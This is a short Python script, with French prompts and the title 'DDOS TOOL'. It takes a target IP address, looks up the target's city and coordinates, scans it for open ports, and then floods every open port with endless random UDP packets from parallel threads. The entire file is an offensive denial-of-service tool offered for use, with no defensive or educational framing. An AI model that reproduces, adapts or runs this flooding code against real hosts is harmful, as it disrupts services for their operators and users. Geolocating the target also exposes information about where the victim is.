import socket
import sys
import ipv4
import pyfiglet
import random
import concurrent.futures
from geocoder import ip as ip_socket


def main():
    pyfiglet.print_figlet("DDOS TOOL")

    print("-" * 60)
    ip = input("Entrez une adresse ip :")
    if not ipv4.exist(ip):
        print(f"[Erreur] Une erreur s'est produite.")
        input("Appuyer sur Entrer pour terminer...")
        sys.exit()
    if not socket.gethostbyname(ip) == ip:
        print(f"{ip}: {socket.gethostbyname(ip)}")
    print(f"Ville: {ip_socket(socket.gethostbyname(ip)).city}")
    print(f"Coordonée: {ip_socket(socket.gethostbyname(ip)).latlng}")

    print("-" * 60)


    def run(port):
        target = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        target.connect((ip, port))
        while True:
            target.send(random._urandom(10**4))

    print("Scan des ports estimé à environ 4 minutes...")
    opened_port = ipv4.scan(ip)

    for port in opened_port:
        print(f"[+]{ip}:{port}")
    print("\n")
    if len(opened_port) != 0:
        with concurrent.futures.ThreadPoolExecutor(max_workers=len(opened_port)) as executor:
            for port in opened_port:
                print(f"[{ip}:{port}] DDOS en cours...")
                executor.submit(run, port)

    else:
        print(f"Aucun port ouvert n'a été trouvé sur {ip}.")
        input("Appuyer sur Entrer pour terminer...")
        sys.exit()


if __name__ == "__main__":
    main()
